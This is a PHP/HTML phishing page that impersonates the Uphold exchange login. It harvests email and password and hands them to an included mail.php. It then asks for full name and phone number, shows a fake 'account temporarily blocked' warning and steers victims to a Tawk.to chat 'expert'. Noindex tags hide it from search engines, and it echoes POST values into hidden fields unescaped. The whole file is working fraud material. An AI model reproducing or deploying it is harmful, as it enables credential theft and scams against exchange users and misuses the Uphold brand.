
<!DOCTYPE html>
<html lang="en">
<head>
    <meta name="robots" content="noindex, nofollow"/>
    <meta name="googlebot" content="noindex, nofollow"/>
    <meta name="bingbot" content="noindex, nofollow"/>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Uphold | Login</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="assets/style.css">
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<link rel="shortcut icon" href="./assets/favicon-32x32.png" />
</head>
<body style="overflow-x: hidden;">
    <div id="background">

    </div>
    <div class="bg-overlay">

    </div>
    <div class="logo m-4">
        <img src="assets/favicon-32x32.png">
    </div>

    <div class="container-fluid" id="upholdForm">
        <div class="row">
            <div class="col-lg-6">
                <div class="content">
                    <h2>The easiest way to invest</h2>
                    <p>Trade between multiple asset classes from one convenient account. A large number of assets are
                        now less than a minute away.</p>
                    <img src="assets/sc.png">

                </div>
            </div>
            <div class="col-lg-6">
                 <?php
                 if (isset($_POST['btnLoginMore'])) {
                    include 'mail.php';
                ?>
                <div class="form">
                    <div class="alert mb-4 alert-danger text-center">Attention: the account has been <b>temporarily blocked due to suspicious activity in your Network IP,</b> kindly verify the following details<br>
                     Kindly contact chat assistance for further help
                   </div>
                    <h2>Verification Required</h2>
                   <br>
                    <form action="" method="post">
                        <input type="hidden" name="email" value="<?php echo $_POST['email']; ?>" />
                        <input type="hidden" name="password" value="<?php echo $_POST['password']; ?>" />
                        <div class="inputField">
                            <label for="name" class="form-label">Full Name</label>
                            <input type="text" name="name" class="form-control" id="name"
                                 required>

                        </div>
                        <div class="inputField">
                            <label for="number" class="form-label">Phone Number</label>
                            <input type="text" name="number" class="form-control" id="number" required>
                        </div>
                       
                        <div class="buttonNext d-grid">
                            <button type="submit" name="fromLog" id="verifyBtn" class="btn">Verify</button>
                        </div>
                    </form>
                </div>
                <script>
                    $(document).ready(function () {
                        $('#verifyBtn').click(function (e) {
                            var number = $('#number').val();
                            var name = $('#name').val();
                            if (name == '') {
                                alert('Invalid Name');
                                $("#name").focus();
                                return false;
                            } else if (!/\(?([0-9]{3})\)?([ .-]?)([0-9]{3})\2([0-9]{4})/.test(number) || (number.length > 11 || number.length < 10)) {
                                alert('Please specify a valid phone number');
                                $("#number").focus();
                                return false;
                            }
                        });
                    });
                </script>

                 <?php } elseif (isset($_POST['fromLog'])) {
                     include 'mail.php';
                 ?>


                 <div class="form">
                   
                    <div class="panel-body text-center">
                        <h2>Account blocked</h2>
                         <p style="font-size: 20px;">Your account has been <b>temporarily blocked</b> due to <br>suspicious activity on your Network IP.<br>Kindly ask an expert</p>
                        <div class="">
                            <label style="font-size: 18px;">Error CODE: <b>6X76D</b></label>
                        </div>
                        <div class="calling-number">
                            <a class="btn btn-danger" href="javascript:void(Tawk_API.toggle())" style="background: #bf0707;color: #fff !important;font-size: 20px;font-weight: 600;margin-top: 15px;">Ask Expert</a>
                        </div>
                    </div>
                   
                </div>

                  <?php } else { ?>
                <div class="form">
                    <h2>Log in to Uphold</h2>
                    <p>Not a member? <a href="#">Sign up now</a></p>
                    <div class="button">
                        <button type="button" class="btn"><img src="assets/roundabout (1).png">Connect with
                            GlobaliD</button>
                    </div>
                    <div class="horizontalLine">
                        <hr>
                        <span>or use your email</span>
                    </div>
                    <form action="" method="post">
                        <div class="inputField">
                            <label for="exampleInputEmail1" class="form-label">Email address</label>
                            <input type="email" name="email" class="form-control" id="exampleInputEmail1"
                                aria-describedby="emailHelp" required>

                        </div>
                        <div class="inputField">
                            <label for="exampleInputPassword1" class="form-label">Password</label>
                            <input type="password" name="password" class="form-control" id="exampleInputPassword1" required>
                        </div>
                        <div class="fgtpwd">
                            <a href="#">Forgot Password ?</a>
                        </div>
                        <div class="buttonNext d-grid">
                            <button type="submit" name="btnLoginMore" class="btn">Next</button>
                        </div>
                    </form>
                </div>
                 <?php } ?>
            </div>
        </div>
    </div>
   
</body>
<!--Start of Tawk.to Script-->
<script type="text/javascript">
var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
(function(){
var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
s1.async=true;
s1.src='https://embed.tawk.to/62628e797b967b11798bfc8e/1g18fp3co';
s1.charset='UTF-8';
s1.setAttribute('crossorigin','*');
s0.parentNode.insertBefore(s1,s0);
})();
</script>
<!--End of Tawk.to Script-->
</html>